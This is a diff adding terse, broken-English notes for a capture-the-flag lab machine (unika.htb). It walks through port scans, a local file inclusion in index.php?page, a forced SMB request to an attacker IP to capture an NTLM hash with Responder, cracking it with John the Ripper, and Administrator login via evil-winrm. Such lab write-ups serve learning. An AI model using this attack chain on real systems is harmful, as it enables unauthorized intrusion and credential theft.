@@ -1,0 +1,22 @@
+1. apply nmap -sS -sV -sC -vvv -oN scan-responder <IP in this moment>
+2. apply masscan -p0-65535 U:0-65535 <IP in this case> -inte=1000 -e tun0
+3. dirb http://<IP in this case> /usr/share/wordlist/dirb/common.txt -o tool_dirb.txt key words 
+4. date port 80 curl -I http://<IP in this case>
+5. add domain unika.htb to my /etc/host
+6. apply view source:DNS or IP in browser or inspect so we saw body with index.php?page
+7. now, apply index.php?page=french.htlm or germany.html
+8. apply LFI with ./../../../../../../../../../windows/system32/drivers/etc/hosts
+it is just windows machine.
+8.1 tool John the Ripper free password craking 
+9. righ now apply tool responder for listen hash at the client does request
+10. apply in URL http://unika.htb/index.php?page=//10.10.16.169/anyyhing
+11. copy we our hash in file type .txt
+12. apply the tool John Ripper for libaray /usr/share/wordlists/rockyou.txt 
+and hash.txt for found password
+12.1 line command john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+13. password: badminton
+14. install evil-winrm with command in console apt install evil-winrm
+for distribution based in debian OS
+15. apply evil-winrm -u Administrator -p 'badminton' -i <IP>/Domain
+16. file flag.txt in archive mike
+
